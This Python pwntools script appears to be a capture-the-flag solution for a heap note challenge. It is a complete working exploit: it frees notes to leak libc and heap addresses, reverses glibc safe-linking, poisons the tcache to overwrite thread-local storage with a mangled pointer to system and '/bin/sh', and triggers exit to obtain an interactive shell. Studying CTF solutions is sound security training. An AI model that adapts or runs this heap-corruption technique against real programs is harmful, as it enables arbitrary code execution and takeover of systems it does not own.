#!/usr/bin/env python3

from pwn import context, ELF, p64, remote, sys, u64


context.binary = ELF('chall_patched')
glibc = ELF('libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, port)


def create(index: int, size: int, data: bytes):
    io.sendlineafter(b'> ', b'0')
    io.sendlineafter(b"Input the note's idx (0 - 19)> ", str(index).encode())
    io.sendlineafter(b"Input the note's size (1 - 1024)> ", str(size).encode())
    io.sendlineafter(b"[+]Enter the notes' content:\n", data)


def edit(index: int, data: bytes):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Input the index of the note to edit (0 - 19)> ', str(index).encode())
    io.sendafter(b"[+]Enter the notes' content:\n", data)


def view(index: int) -> bytes:
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Input the index of the note to read (0 - 19)> ', str(index).encode())
    io.recvuntil(f'Note {index}:\n'.encode())
    return io.recvuntil(b'\n0 ->', drop=True)


def delete(index: int):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Input the index of the note to delete (0 - 19)> ', str(index).encode())


def deobfuscate(x: int, l: int = 64) -> int:
    p = 0

    for i in range(l * 4, 0, -4):
        v1 = (x & (0xf << i)) >> i
        v2 = (p & (0xf << i + 12 )) >> i + 12
        p |= (v1 ^ v2) << i

    return p


def obfuscate(ptr: int, addr: int) -> int:
    return ptr ^ (addr >> 12)


io = get_process()

for i in range(8):
    create(i, 0xa8, b'asdf')

for i in range(8):
    delete(7 - i)

glibc.address = u64(view(0).ljust(8, b'\0')) - 0x203b20
heap_addr = deobfuscate(u64(view(1).ljust(8, b'\0'))) & 0xfffffffffffff000

io.success(f'Glibc base address: {hex(glibc.address)}')
io.success(f'Heap base address: {hex(heap_addr)}')

tls_addr = glibc.address - 0x28c0

tls_payload  = p64(tls_addr - 0x80 + 0x38)
tls_payload += p64(glibc.sym.system << 17)
tls_payload += p64(next(glibc.search(b'/bin/sh')))
tls_payload += p64(0) * 7
tls_payload += p64(tls_addr)
tls_payload += p64(tls_addr + 0x9a0)
tls_payload += p64(tls_addr)
tls_payload += p64(0) * 4

edit(1, p64(obfuscate(tls_addr - 0x80 + 0x30, heap_addr + 0x290 + 0xb0)))
create(8, 0xa8, b'asdf')
create(9, 0xa8, tls_payload)

io.sendlineafter(b'> ', b'4')
io.recvuntil(b'[+] Exiting app...\n')

io.interactive()
